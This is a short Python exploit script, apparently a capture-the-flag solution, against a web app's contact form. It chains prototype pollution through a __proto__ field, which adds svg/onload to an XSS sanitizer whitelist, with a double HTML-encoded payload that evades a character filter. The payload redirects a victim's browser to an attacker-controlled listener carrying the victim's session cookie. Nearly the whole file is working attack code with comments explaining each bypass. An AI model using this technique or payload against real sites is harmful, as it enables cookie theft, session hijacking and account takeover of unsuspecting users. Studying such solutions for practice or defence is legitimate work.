import requests

# start a listener and insert the host here to receive the stolen cookie.
# also possible to use a service such as ngrok if desired
HOST = "http://[REDACTED]:9999"

# html encode every character in a provided string
def html_encode(string):
    return "".join(f"&#{ord(c)};" for c in string)

# javascript to steal the cookie and send it to an attacker controlled location
payload = f"document.location='{HOST}/?c='+document.cookie"

# html encode the payload twice to bypass the blacklist filter for c's.
# this works because the `xss` npm package has a documented issue where it
# un-escapes whitelisted tags and doesn't re-escape them
payload = html_encode(html_encode(payload))

# use svg/onload rather than script/src in order to bypass the same c filter
payload = f"<svg onload={payload}>" 

# use the __proto__ field to pollute the global object and add svg/onload
# to the allowed tags whitelist so that the XSS filter doesn't escape it.
# also set emergency to true so that the hero views the message and triggers
# the XSS which steals his cookie

data = {
        "__proto__": {"whiteList": {"svg": ["onload"]}},
        "emergency": True, 
        "message": payload
}

res = requests.post("http://localhost:8080/contact", json=data)
print(res.text)
